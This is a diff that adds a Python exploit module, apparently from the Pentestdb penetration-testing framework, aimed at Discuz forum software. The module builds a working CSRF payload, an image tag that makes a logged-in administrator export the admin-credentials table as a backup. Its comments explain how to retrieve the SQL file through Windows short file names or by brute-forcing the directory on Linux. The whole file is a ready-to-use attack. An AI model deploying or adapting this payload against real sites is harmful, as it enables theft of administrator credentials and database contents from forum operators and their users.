@@ -1,0 +1,45 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+import datetime
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzCSRF(Exploit):
+    expName = u"Discuz CSRF备份数据库脱库"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2014-064886']
+    description = u'''
+        漏洞利用条件：discuz/discuz x
+        CSRF诱使管理员备份数据库，下载数据库备份文件，如果是windows则可利用短文件名下载
+    '''
+
+    def _info(self):
+        result = Result(self)
+
+        url = self.urlJoin("admin.php")
+
+        filename = "alpha"
+        params = "?action=db&operation=export&setup=1&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_ucenter_admins&method=multivol&sizelimit=2048&extendins=0&sqlcompat=&usehex=1&usezip=0&filename={0}&exportsubmit=yes".format(filename)
+        
+        payload = "<img src='{0}'>".format(url+params)
+
+        result['isvul'] = Result.INFO
+        result['fullpath'] = url
+        result['elseinfo'] = u"发帖，嵌入图片{0}，\n如果目标服务器为windows：\ndiscuzX访问/data/backup~1/{1}-1.sql，\ndiscuz访问/forumdata/backup~1/{1}-1.sql，\n目标服务器为linux则需要爆破backup_xxxxxx目录".format(payload,filename)
+
+        return result
+
+    
